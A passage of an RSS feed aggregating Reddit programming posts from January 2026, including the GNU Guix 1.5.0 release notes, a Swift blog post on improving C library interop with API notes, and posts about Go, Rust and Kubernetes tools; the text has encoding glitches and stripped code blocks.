go.work?]]></content:encoded></item><item><title>rust_analyzer is eating my memory, any counter measure?</title><link>https://www.reddit.com/r/rust/comments/1qkqcqr/rust_analyzer_is_eating_my_memory_any_counter/</link><author>/u/EarlyPresentation186</author><category>rust</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 13:08:37 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[I have 32Gb of RAM, on this linux system I'm running 3 browser instances, and the rest is neovim instances to edit rust code. I sometimes open multiple neovim instances in different git worktrees (or in the same directory) and from my understanding each one starts a rust_analyzer instance. This leads to my system swapping and even grinding to a halt because the swap is full. I will again increase the swap and try to decrease the swapiness now. But does anyone have other suggestions to limit the memory consumption by rust-analyzer?]]></content:encoded></item><item><title>GNU Guix 1.5.0 released</title><link>https://guix.gnu.org/blog/2026/gnu-guix-1.5.0-released/</link><author>/u/efraimf</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 13:04:06 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[NoÃ© Lopez â€” January 23, 2026We are pleased to announce the release of GNUÂ Guix version 1.5.0!The release comes with ISO-9660 installation images, virtual machine
images, and with tarballs to install the package manager on top of your
GNU/Linux distro, either from source or from binariesâ€”check out the
download page.  Guix users can
update by running .Itâ€™s been 3 years since the previous
release.
Thatâ€™s a lot of time, reflecting both the fact that, as a , users continuously get new features and update by running
; but it also shows a lack of processes, something that we
had to address before another release could be made.Illustration by Luis Felipe, published under CC-BY-SAÂ 4.0.This post provides highlights for all the hard work that went into
this release.  Thereâ€™s a lot to talk about so make yourself
comfortable, relax, and enjoy.To start with, the Guix ecosystem has seen many exciting developments
to the way we collaborate and make decisions!Firstly, the project adopted with unanimity a new consensus-based
decision making
process.
This process fills a need to be able to gather consensus on
significant changes to the project, something that was getting very
complicated with the growing number of contributors to the project.Now, the process provides a clear framework for any contributor to
propose and implement important changes. These can be submitted as
Guix Consensus Documents (GCDs), each GCD goes through the multiple
steps of consensus decision
making before being
accepted or withdrawn.Secondly, using this process, the project was able to collectively
migrate to
Codeberg.
This means that all repositories, and bug trackers are now at the same
place on Codeberg and that contributions are now made with pull
requests instead of patch series.Thirdly, a new release
process
was adopted to bring an annual release cycle to Guix. This release is
the first to follow this process, with hopefully many others to come!Three years is a long time for free and open source software!  Enough
time for 12,525 new packages and 29,932 package updates to the Guix
repository.  Here are the best highlights:To start, KDE Plasma 6.5 is now available with the new
plasma-desktop-service-type!Continuing on desktops; GNOME has been updated from version 42 to 46
and now uses Wayland by default.  The gnome-desktop-service-type was
made more modular to better customize the default set of GNOME
applications.Guix System is now using version 1.0 of the
GNUÂ Shepherd,
which now supports timed services, kexec reboot and has new services
for system logs and log rotation which are now used by Guix System
instead of Rottlog and syslogd. has been replaced with  in
operating-system definitions to support giving specific Linux
capabilities.  Additonally, the  package is now included in
%base-packages.More than 12,500 packages were added, keeping Guix in the top-ten
biggest distributions according to Repology!
Among the many noteworthy updates, we now have GCCÂ 15.2.0, EmacsÂ 30.2,
Icecat and LibrewolfÂ 140, LLVMÂ 21.1.8 and Linux-libreÂ 6.17.12.In the last release, we introduced structured cooperation using
teams.
There are now 50 teams distributing the many aspects of the
distribution.  We have per-language teams like ,  and
 ensuring updates for packages and build systems as well as
thematic teams like ,  and  working
on specific application domains. Here are what some of these teams
have been up to:The electronics team is maintaining free software based Electronic
Design Automation (EDA) packages to cover the needs of professionals
and hobbyists in the domain with tools such as KiCad, LibrePCB,
Xschem, Qucs-S and RingdoveÂ EDA, as well as Verilog, SystemVerilog and
VHDL compilers and a toolchain for programmable designs on GateMate
FPGAs.  They are also collaborating with the Free Silicon Foundation
(F-Si)
to push free software in the EDA space!The science team has been able to add a myriad of Astronomy related
packages,
accompanied by the Python team bringing the move to the new
pyproject.toml-based build system as well as the NumPyÂ 2 update.Finally, the rust team created a new packaging
model to
efficiently package rust crates, and was able to migrate the Rust
collection, 150+ packages with 3,600+ libraries, in just under two
weeks; making the Rust packaging process much easier for everyone.Full-source bootstraps of the Zig and Mono compilers are now
available, and the existing bootstrap of Guix has been reduced once
again!Full-source bootstraps are Guixâ€™s solution to the trusting trust
problem: compilers are usually compiled by themselves, so how can you
build a compiler without trusting an existing binary?  Read these
posts to learn more about this fascinating problem:Lastly, a new 
command
is now available to find which packages provide a given file.It is now possible to run the Guix daemon without root
privileges,
reducing the impact of privilege escalation vulnerabilities.This is possible thanks to the user namespaces. It might be possible
that on your system, the user namespaces are not allowed for guix due
to the lack of an AppArmor profile. Because of that, weâ€™ve also
included AppArmor
profiles
that are installed by default on foreign systems.Release tarballs are now available for the RISC-V 64-bit architecture
(riscv64-linux).The x86_64 architecture saw some development as well, with the
experimental support of the GNUÂ Hurd kernel (x86_64-gnu), aiming to
be another significant step in the adoption and development of the
Hurd.  Overall support for the Hurd was greatly improved, it is now an
option in the installer, childhurds can be automatically created with
a system service and it can even run on a Thinkpad
X60!Surprisingly, making a completely free software distribution does not
come for free!  The Guix project needs your help to pay the
infrastructure costs of build farms, web servers and QA tools that are
essential to making this release happen.For the release, thanks to all the release team members: Rutherther,
RodionÂ Goritskov, EfraimÂ Flashner, and NoÃ©Â Lopez. Thanks as well to
the release helpers: AndreasÂ Enge, Mothacehe, Dariqq and
LudovicÂ CourtÃ¨s.For creating the release process, thanks to SteveÂ George.For their Guix contributions, thanks to the 744 wonderful people who
contributed and whose names we donâ€™t list here (it would be a bit
long).
They can be listed with git log --oneline v1.4.0..v1.5.0 --format="%an" | sort -u.  Every commit counts and is always
appreciatedÂ ðŸ˜GNU Guix is a transactional package manager and
an advanced distribution of the GNU system that respects user
freedom.
Guix can be used on top of any system running the Hurd or the Linux
kernel, or it can be used as a standalone operating system distribution
for i686, x86_64, ARMv7, AArch64, RISC-V and POWER9 machines.In addition to standard package management features, Guix supports
transactional upgrades and roll-backs, unprivileged package management,
per-user profiles, and garbage collection.  When used as a standalone
GNU/Linux distribution, Guix offers a declarative, stateless approach to
operating system configuration management.  Guix is highly customizable
and hackable through Guile
programming interfaces and extensions to the
Scheme language.Unless otherwise stated, blog posts on this site are
copyrighted by their respective authors and published under the terms of
the CC-BY-SA 4.0 license and those of the GNU Free Documentation License (version 1.3 or later, with no Invariant Sections, no
Front-Cover Texts, and no Back-Cover Texts).]]></content:encoded></item><item><title>Event-loop based Memcached client for Go (alpha, benchmarks included)</title><link>https://www.reddit.com/r/golang/comments/1qkpylk/eventloop_based_memcached_client_for_go_alpha/</link><author>/u/melioneer</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 12:50:50 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Iâ€™m working on , an experimental Memcached client for Go focused on high-concurrency.The main motivation was hitting scaling limits with goroutine-per-request clients under high load, so memcachex is built around:an event-loop based network engineasync API (sync wrappers on top)The project is  and performance-first.Iâ€™ve included reproducible end-to-end benchmarks comparing memcachex with gomemcache:client + memcached CPU usageIâ€™m very interested in constructive feedback and criticism, especially around:design tradeoffs or flaws in the approachreal-world workloads where this design  or  make sensesharp edges youâ€™d expect from an event-loop based client in GoHappy to discuss design decisions or answer questions.]]></content:encoded></item><item><title>Improving the usability of C libraries in Swift</title><link>https://www.swift.org/blog/improving-usability-of-c-libraries-in-swift/</link><author>/u/TheTwelveYearOld</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 12:24:51 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[There are many interesting, useful, and fun C libraries in the software ecosystem. While one could go and rewrite these libraries in Swift, usually there is no need, because Swift provides direct interoperability with C. With a little setup, you can directly use existing C libraries from your Swift code.When you use a C library directly from Swift, it will look and feel similar to using it from C. That can be useful if youâ€™re following sample code or a tutorial written in C, but it can also feel out of place. For example, hereâ€™s a small amount of code using a C API:The C library here that Swift is using comes from the webgpu-headers project, which vends a C header () that is used by several implementations of WebGPU. WebGPU  is a technology that enables web developers to use the systemâ€™s GPU (Graphics Processing Unit) from the browser. For the purposes of this post, you donâ€™t really need to know anything about WebGPU: Iâ€™m using it as an example of a typical C library, and the techniques described in this blog post apply to lots of other well-designed C libraries.The Swift code above has a very â€œCâ€ feel to it. It has global function calls with prefixed names like wgpuInstanceCreateSurface and global integer constants like . It pervasively uses unsafe pointers, some of which are managed with explicit reference counting, where the user provides calls to  and  functions. It works, but it doesnâ€™t feel like Swift, and inherits various safety problems of C.Fortunately, we can improve this situation, providing a safer and more ergonomic interface to WebGPU from Swift that feels like it belongs in Swift. More importantly, we can do so without changing the WebGPU implementation: Swift provides a suite of annotations that you can apply to C headers to improve the way in which the C APIs are expressed in Swift. These annotations describe common conventions in C that match up with Swift constructs, projecting a more Swift-friendly interface on top of the C code.In this post, Iâ€™m going to use these annotations to improve how Swift interacts with the WebGPU C code. By the end, weâ€™ll be able to take advantage of Swift features like argument labels, methods, enums, and automatic reference counting, like this:These same annotations can be used for any C library to provide a safer, more ergonomic development experience in Swift without changing the C library at all.: Some of what is covered in this post requires bug fixes that first became available in Swift 6.2.3.A module map is a way of layering a Swift-friendly modular structure on top of C headers. You can create a module map for the WebGPU header by writing the following to a file :The easiest thing to do is to put  alongside the header itself. For my experiment here, I put it in the root directory of my  checkout. If youâ€™re in a Swift package, put it into its own target with this layout:If you reference this  target from elsewhere in the package, you can  to get access to the C APIs.There are a few ways to see what the Swift interface for a C library looks like.The swift-synthesize-interface tool in Swift 6.2+ prints the Swift interface to the terminal.Xcodeâ€™s â€œSwift 5 interfaceâ€ counterpart to the  header will show how the header has been mapped into Swift.Letâ€™s do it from the command line, using swift-synthesize-interface. From the directory containing  and , run:The leading  and the  argument with the path is only needed on macOS; on other platforms, make sure swift-synthesize-interface is in your path. The  operation is the triple provided if you run swiftc -print-target-info. It looks like this:The output of swift-synthesize-interface is the Swift API for the WebGPU module, directly translated from C. For example, this code from the WebGPU header:and there are lots of global functions like this:Itâ€™s a starting point! You can absolutely write Swift programs using these WebGPU APIs, and theyâ€™ll feel a lot like writing them in C. Letâ€™s see what we can do to make it better.C enums can be used for several things. Sometimes they really represent a choice among a number of alternatives. Sometimes they represent flags in a set of options, from which you can choose several. Sometimes theyâ€™re just a convenient way to create a bunch of named constants. Swift conservatively imports enum types as wrappers over the underlying C type used to store values of the enum (e.g.,  wraps a ) and makes the enumerators into global constants. It covers all of the possible use cases, but it isnâ€™t .The  enum really is a choice among one of several options, which would be best represented as an  in Swift. If we were willing to modify the header, we could apply the  attribute to the enum, like this:This works, and results in a much nicer Swift API:Now, we get an  that we can switch over, and nice short case names, e.g.,Thatâ€™s great, but I already broke my rule: no header modifications unless I have to!The problem of needing to layer information on top of existing C headers is not a new one. As noted earlier, Swift relies on a Clang feature called API notes to let us express this same information in a separate file, so we donâ€™t have to edit the header. In this case, we create a file called  (the name  matches the module name from ), which is a YAML file describing the extra information. Weâ€™ll start with one that turns  into an : here is a term used in the C and C++ standard to refer to enum, struct, union, or class types. Any information about those types in the API notes file will go into that section.Put  alongside the , and now  gets mapped into a  enum. For a package, the structure will look like this:Weâ€™ll be adding more to this API notes file as we keep digging through the interface.The WebGPU header has a number of â€œobjectâ€ types that are defined like this:This gets imported into Swift as an alias for an opaque pointer type, which isâ€¦ not great:WebGPU object types are reference counted, and each object type has corresponding  and  functions to increment and decrement the reference count, like this:Of course, you can use these functions in Swift exactly how you do in C, making sure to balance out calls to  and , but then it would be every bit as unsafe as C.We can do better with . Itâ€™s a macro (defined in the  header) that can turn a reference-counted C type like the above into an automatically reference-counted  in Swift. Hereâ€™s how we would use it in the header:Now,  gets imported like this:The extra typealias is a little unexpected, but overall this is a huge improvement: Swift is treating  as a class, meaning that it automatically manages retains and releases for you! This is both an ergonomic win (less code to write) and a safety win, because itâ€™s eliminated the possibility of mismanaging these instances.Thereâ€™s one more thing: when dealing with reference-counting APIs, you need to know whether a particular function that returns an object is expecting you to call â€œreleaseâ€ when youâ€™re done. In the WebGPU header, this information is embedded in a comment:â€œReturnedWithOwnershipâ€ here means that the result of the call has already been retained one extra time, and the caller is responsible for calling â€œreleaseâ€ when they are done with it. The  header has a  macro that expresses this notion. One can use it like this:Now, Swift will balance out the retain that wgpuDeviceCreateBindGroup has promised to do by performing the extra release once youâ€™re done using the object. Once these annotations are done, weâ€™re all set with a more ergonomic and memory-safe API for this C library. Thereâ€™s no need to ever call  or  yourself.Weâ€™ve hacked up our header again, so letâ€™s undo that and move all of this out to API notes. To turn a type into a foreign reference type, we augment the  section of our API notes with the same information, but in YAML form:That makes  import as a class type, with the given retain and release functions. We can express the â€œreturns retainedâ€ behavior of the wgpuDeviceCreateBindGroup function like this:Thatâ€™s enums and classes, so now letâ€™s tackleâ€¦ functions.A typical function from , like this:will come into Swift like this:Note that  on each parameter, which means that we wonâ€™t use argument labels for anything when we call it:That matches C, but it isnâ€™t as clear as it could be in Swift. Letâ€™s clean this up by providing a better name in Swift that includes argument labels. We can do so using  (also in ), like this:Within the parentheses, we have each of the argument labels that we want (or  meaning â€œno labelâ€), each followed by a . This is how one describes a full function name in Swift. Once weâ€™ve made this change to the Swift name, the C function comes into Swift with argument labels, like this:That makes the call site more clear and self-documenting:There is more usable structure in this API. Note that the  function takes, as its first argument, an instance of . Most of the C functions in  are like this, because these are effectively functions that operate on their first argument. In a language that has methods, they would be methods. Swift has methods, so letâ€™s make them methods!There are three things to notice about this  string:It starts with , which tells Swift to make this function a member inside .Letâ€™s change the function name to , because we no longer need the  prefix to distinguish it from other â€œwrite bufferâ€ operations on other types.The name of the first argument in parentheses is , which indicates that the  argument (in Swift) should be passed as that positional argument to the C function. The other arguments are passed in-order.Note that this also requires  to be imported as a , as we did earlier for . Once weâ€™ve done so, we get a much-nicer Swift API:Weâ€™ve hacked up the header again, but didnâ€™t have to. In , you can put a  attribute on any entity. For , it would look like this (in the  section): has a number of  functions that produce information about some aspect of a type. Here are two for the  type:With the  tricks above, we can turn these into â€œgetâ€ methods on , like this:Thatâ€™s okay, but itâ€™s not what youâ€™d do in Swift. Letâ€™s go one step further and turn them into read-only computed properties. To do so, use the  prefix on the Swift name we define. Weâ€™ll skip ahead to the YAML form that goes into API notes:And now, we arrive at a nice Swift API: can also be used to import a function that returns a new instance as a Swift initializer. For example, this function creates a new  (which we assume is getting imported as a  like weâ€™ve been doing above):We can turn this into a Swift initializer, which is used to create a new object, using the same  syntax but where the method name is . Here is the YAML form that goes into API notes:and here is the resulting Swift initializer:Now, one can create a new  with the normal object-creation syntax, e.g.,The WebGPU header defines its own Boolean type. I wish everyone would use C99â€™s  and be done with it, but alas, here are the definitions for WebGPUs Boolean types:This means that  will come in to Swift as a . The two macros arenâ€™t available in Swift at all: theyâ€™re â€œtoo complicatedâ€ to be recognized as integral constants. Even if they were available in Swift, it still wouldnâ€™t be great because we want to use  and  for Boolean values in Swift, not  and .To make  easier to use from Swift, weâ€™re first going to map that typedef to its own  that stores the underlying , giving it an identity separate from . We can do this using a  API note within the  section of the file, like this:Now, we get  imported like this:To be able to use  and  literals with this new , we can write a little bit of Swift code that makes this type conform to the ExpressibleByBooleanLiteral protocol, like this:Thatâ€™s it! Better type safety (you cannot confuse a  with any other integer value) and the convenience of Boolean literals in Swift. describes a set of flags using a  of the  type (a 64-bit unsigned integer) along with a set of global constants for the different flag values. For example, here is the  flag type and some of its constants:Similar to what we saw with ,  is a  of a  of a . Thereâ€™s no type safety in this C API, and one could easily mix up these flags with, say, those of :We can do better, by layering more structure for the Swift version of this API using the same  approach from . This goes into the  section of API notes:Now,  comes in as its own :The initializers let you create a  from a  value, and there is also a  property to get a  value out of a , so the raw value is always thereâ€¦ but the default is to be type safe. Additionally, those global constants will come in as members of , like this:This means that, if youâ€™re passing a value of type , you can use the shorthand â€œleading dotâ€ syntax. For example:Swift has dropped the common  prefix from the constants when it made them into members. However, the resulting names arenâ€™t great. We can rename them by providing a  in the API notes file within the  section:We can go one step further by making the  type conform to Swiftâ€™s  protocol. If we revise the API notes like this:Now, we get the nice option-set syntax we expect in Swift:Throughout , the  macro is used to indicate pointers that can be NULL. The implication is that any pointer that is not marked with  cannot be NULL. For example, here is the definition of  we used above:The  indicates that itâ€™s acceptable to pass a NULL pointer in as the  parameter. Clang already has nullability specifiers to express this information. We could alter the declaration in the header to express that this parameter is nullable but the result type is never NULL, like this:This eliminates the implicitly-unwrapped optionals () from the signature of the initializer, so we end up with one that explicitly accepts a  descriptor argument and always returns a new instance (never ):Now, I did cheat by hacking the header. Instead, we can express this with API notes on the parameters and result type by extending the entry we already have for  like this:To specific nullability of pointer parameters, one can identify them by position (where 0 is the first parameter to the function) and then specify whether the parameter should come into Swift as optional (, corresponds to ), non-optional (, corresponds to ) or by left unspecified as an implicitly-unwrapped optional (, corresponds to ). For the result type, itâ€™s a little different: we specified the result type along with the nullability specifier, i.e., . The end result of these annotations is the same as the modified header, so we can layer nullability information on top of the header. is about 6,400 lines long, and is regenerated from a database of the API as needed. Each of the WebGPU implementations seems to augment or tweak the header a bit. So, rather than grind through and manually do annotations, I wrote a little Swift script to â€œparseâ€ , identify its patterns, and generate  for most of what is discussed in this post. The entirety of the script is here. It reads  from standard input and prints  to standard output.Because  is generated, it has a very regular structure that we can pick up on via regular expressions. For example:Thatâ€™s enough to identify all of the enum types (so we can emit the EnumExtensibility: closed API notes), object types (to turn them into shared references), and functions (which get nicer names and such). The script is just a big  loop that applies the regexes to capture all of the various types and functions, then does some quick classification before printing out the API notes. The resulting API notes are in WebGPU.apinotes, and the generated Swift interface after these API notes are applied is here. You can run it with, e.g.,swift  webgpu_apinotes.swift < webgpu.h
This script full of regular expressions is, admittedly, a bit of a hack. A better approach for an arbitrary C header would be to use  to properly parse the headers. For WebGPU specifically, the webgpu-headers project contains a database from which the header is generated, and one could also generate API notes directly from that database. Regardless of how you get there, many C libraries have well-structured headers with conventions that can be leveraged to create safer, more ergonomic projections in Swift.The techniques described in this post can be applied to just about any C library. To do so, I recommend setting up a small package like the one described here for WebGPU, so you can iterate quickly on example code to get a feel for how the Swift projection of the C API will work. The annotations might not get you all the way to the best Swift API, but they are a lightweight way to get most of the way there. Feel free to also extend the C types to convenience APIs that make sense in Swift, like I did above to make  conform to ExpressibleByBooleanLiteral.A little bit of annotation work on your favorite C library can make for a safer, more ergonomic, more Swifty experience of working with that library.The regular structure of  helped considerably when trying to expose the API nicely in Swift. That said, there are a few ways in which  could be improved to require less annotation for this purpose: would be slightly nicer if placed on the  itself, rather than on the . If it were there, we could useand not have to generate any API notes to bring these types in as proper enums in Swift. could provide the names of the retain and release operations and be placed on the  itself. If it were there, we could useand not have to generate any API notes to bring these types in as classes in Swift. could be placed on the pointer itself (i.e., after the ) rather than at the beginning of the type, to match the position of Clangâ€™s nullability attributes. If it were placed there, thenwould work with Clangsâ€™ longstanding nullable-types support. Swift would then import such pointers as optional types (with ). Moreover, if some macros WGPU_ASSUME_NONNULL_BEGIN and  were placed at the beginning and end of the header, they could be mapped to Clangâ€™s pragmas to assume that any pointer not marked â€œnullableâ€ is always non-null:This would eliminate all of the implicitly unwrapped optionals (marked  in the Swift interface), making it easier to use safely.]]></content:encoded></item><item><title>DiffÃ©rence OpenShift Sandbox et OpenShift Complet Version</title><link>https://chatgpt.com/share/69734747-dff4-8003-9f9d-71c44a568d1f</link><author>/u/Ill-Maize-2343</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 12:20:10 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Building a small tool to visualize Kubernetes RBAC â€” need feedback</title><link>https://www.reddit.com/r/kubernetes/comments/1qkp8dz/building_a_small_tool_to_visualize_kubernetes/</link><author>/u/Mobile_Theme_532</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 12:15:23 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Hey folks, Iâ€™m building a small MVP called **KubeScope** to help understand Kubernetes RBAC faster.* Upload RBAC snapshot (.json / .zip)* Show totals (Subjects / Roles / Bindings)* Detect risky permissions like cluster-admin, wildcard \*, secrets access, pods/exec, rolebinding create/updateNext Iâ€™m building an **RBAC Map** view (Subject â†’ Binding â†’ Role â†’ Permissions).**Question:** Whatâ€™s the most painful RBAC problem youâ€™ve faced in real clusters?Would love suggestions on rules/features to add.]]></content:encoded></item><item><title>Help me review my realtime chat app tech stack (Go + Centrifugo + Redis)</title><link>https://www.reddit.com/r/golang/comments/1qkocb0/help_me_review_my_realtime_chat_app_tech_stack_go/</link><author>/u/Intrepid_Cover_9410</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 11:27:34 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Iâ€™m building a realtime group chat app and want feedback on my backend stack before committing. Stack: Go (API + auth + business logic) Centrifugo (WebSocket realtime) Redis (pub/sub + presence + caching) PostgreSQL (messages + groups + users) Hetzner VPS (self-hosted) Docker + Nginx (deployment + reverse proxy) Is this a solid approach for a production chat app? Any improvements or missing pieces?My main goal is to handle around 50k total downloads and at least 10k active concurrent users smoothly, without message delays, lag, or stability issues during traffic spikes, while keeping infrastructure costs predictable and avoiding major rework]]></content:encoded></item><item><title>A very serious attempt is being made to fix DX12 on Linux!</title><link>https://www.reddit.com/r/linux/comments/1qko9jn/a_very_serious_attempt_is_being_made_to_fix_dx12/</link><author>/u/lajka30</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 11:23:13 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>OneTalker - An Augmentative and Alternative Communication (AAC) app written in Rust</title><link>https://www.reddit.com/r/rust/comments/1qknxzz/onetalker_an_augmentative_and_alternative/</link><author>/u/MissionNo4775</author><category>rust</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 11:04:44 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[I'm happy to announce that the first ever version of OneTalker is out!I wrote it for my son Ben, who is a full-time wheelchair user and has Quadriplegic Cerebral Palsy.Ben DOES NOT tolerate slow things, and this absolutely MUST NOT crash either!His current Augmentative and Alternative Communication apps are slow, so he doesn't like using them. I hope others find it useful too.I think it's first AAC app in the world written in Rust.For those interested, I'd love it if you could test it. I'm working on getting all the packages signed at moment. Thanks!]]></content:encoded></item><item><title>Weekly: Share your victories thread</title><link>https://www.reddit.com/r/kubernetes/comments/1qknvb9/weekly_share_your_victories_thread/</link><author>/u/gctaylor</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 11:00:31 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Got something working? Figure something out? Make progress that you are excited about? Share here!]]></content:encoded></item><item><title>Automated code review tools</title><link>https://www.reddit.com/r/golang/comments/1qknkrf/automated_code_review_tools/</link><author>/u/Last-Prior-5525</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 10:42:43 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[We are currently looking into incorporating more automated tools in our code review process - particularly around Go best practices (the general spirit is the Google style guide). We already have the basics - golangci-lint as well as cursor bugbot - but I'm more interested in code structure issues (proper dependency injection, usage of interfaces, http best practices).I'd love to hear any advice from own experience.]]></content:encoded></item><item><title>I donâ€™t think using AI for surveillance of kids in school is a good idea</title><link>https://www.reddit.com/r/artificial/comments/1qknhjn/i_dont_think_using_ai_for_surveillance_of_kids_in/</link><author>/u/No_Turnip_1023</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 10:37:02 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[There's this post on Linkedin, where they demonstarte an "experiment". This is how they define it: "We tried to build an AI vision model which can tell, in real time, which students are attentive and which ones are distracted in a classroom.""... (this) AI computer vision SaaS originally designed to monitor factories and offices. We tried to use the AI monitoring application inside our classroom. Just for fun, honestly."Notice the words, "just for fun". You just built a system for surveillance of kids in schools.... for FUN.They justify this by highlighting a positive use case: this tech will provide feedback to teachers.This is a great example of tech not being the problem, but how people use it.If they really wanted to use AI to improve education, why not build a AI powered personalized education system. But no, a surveillance system is what came to their minds.School is suffocating enough as it is. Now people are using AI amplify it. If anything, we could do with less of it in schools, make them more open.]]></content:encoded></item><item><title>Whosthere: A LAN discovery tool with a modern TUI, written in Go</title><link>https://www.reddit.com/r/golang/comments/1qknfeu/whosthere_a_lan_discovery_tool_with_a_modern_tui/</link><author>/u/Raya_98</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 10:33:22 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I've been working on a LAN discovery tool with a Terminal User Interface (TUI) written entirely in Go. It's called , and it's designed to help you explore devices on your local network without requiring elevated privileges.It works by combining several discovery methods:ARP cache reading (after triggering ARP resolution via TCP/UDP sweeps)OUI lookups to identify device manufacturersA fast, keyboard-driven TUI (powered by tview)An optional built-in port scannerDaemon mode with a simple HTTP API to fetch devicesConfigurable theming and behavior via a YAML config file Mainly to learn, I've been programming in Go for about a year now and wanted to combine learning Go with learning more about networking in one single project. I've always been a big fan of TUI applications like lazygit, k9s, and dive. And then the idea came to build a TUI application that shows devices on your LAN. I am by no means a networking expert, but it was fun to figure out how ARP works, and discovery protocols such as mDNS and SSDP.# install via HomeBrew brew tap ramonvermeulen/whosthere brew install whosthere # or with go install go install github.com/ramonvermeulen/whosthere@latest # run as TUI whosthere # run as daemon whosthere daemon --port 8080 I'd love to hear your feedback, if you have ideas for additional features or improvements that is highly appreciated! Current platform support is Linux and MacOS.]]></content:encoded></item><item><title>CKB â€” A code intelligence server written in Go (SCIP-based, 80+ query tools via MCP)</title><link>https://www.reddit.com/r/golang/comments/1qkmug3/ckb_a_code_intelligence_server_written_in_go/</link><author>/u/Maleficent-Sun9141</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 09:58:34 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I built CKB in Go â€” it indexes your codebase using SCIP and exposes 80+ code intelligence queries through CLI, HTTP API, and MCP (Model Context Protocol for AI assistants).CKB turns your repo into a queryable knowledge base. You ask structured questions about your code â€” symbol lookup, call graphs, reference tracing, impact analysis â€” and get precise answers instead of grepping around.ckb query call-graph --symbol "ProcessOrder" --direction callersckb query impact --symbol "UserService.Create"ckb query affected-tests --path internal/auth/ckb arch --format=human ```Single binary, zero runtime dependenciesFast indexing â€” SCIP parsing + SQLite storageConcurrent backend orchestration (SCIP, LSP, Git backends queried in parallel)Bubble-free deployment â€” , Homebrew, npm wrapper, or Dockeramazingly easy to build tools with <3  CLI / HTTP API / MCP Server â†“ Query Engine (internal/query/) â†“ Backend Orchestrator â†“ SCIP | LSP | Git backends â†“ SQLite storage layer The query engine uses a three-tier cache (query â†’ view â†’ negative) and a "backend ladder" that tries SCIP first, falls back to LSP, then Git-based heuristics. Results are merged using configurable strategies and compressed to fit LLM response budgets.Interesting Go patterns usedFingerprint-based symbol identity â€” symbols get stable IDs () that survive renames via alias chains for cyclomatic/cognitive complexity scoring for long-running MCP operationsResponse budget enforcement â€” output is compressed/truncated to fit token limits with drilldown suggestions for truncated resultsSupported languages (for indexing)Go, TypeScript, Python, Rust, Java, Kotlin, C++, Dart, Ruby, C#go install github.com/SimplyLiz/CodeMCP/cmd/ckb@latestbrew tap SimplyLiz/ckb && brew install ckbnpm install -g @tastehub/ckbckb init && ckb index ```Feedback on the architecture or API design welcome. Happy to discuss the SCIP integration or the backend orchestration approach if anyone's curious.]]></content:encoded></item><item><title>[R] Advice regarding CVPR Rebuttal</title><link>https://www.reddit.com/r/MachineLearning/comments/1qkm7y2/r_advice_regarding_cvpr_rebuttal/</link><author>/u/Forsaken-Order-7376</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 09:19:15 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[Received reviews 5(3),3(4),2(3). Assume that- Case 1. None of the reviewers increase their score Case 2. One of the reviewers increases his score, giving 5(3),3(4),3(3).In both the cases, what are my chances of getting an acceptance? I plan to withdraw and submit to another conference if the chances of acceptance appear slim]]></content:encoded></item><item><title>Khronos released VK_EXT_descriptor_heap</title><link>https://github.com/KhronosGroup/Vulkan-Docs/commit/87e6442f335fc08453b38bbd092ca67c57bfd3ab</link><author>/u/lajka30</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 07:59:13 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Help choosing a distributed storage solution</title><link>https://www.reddit.com/r/kubernetes/comments/1qkk6j0/help_choosing_a_distributed_storage_solution/</link><author>/u/NASAonSteroids</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 07:12:00 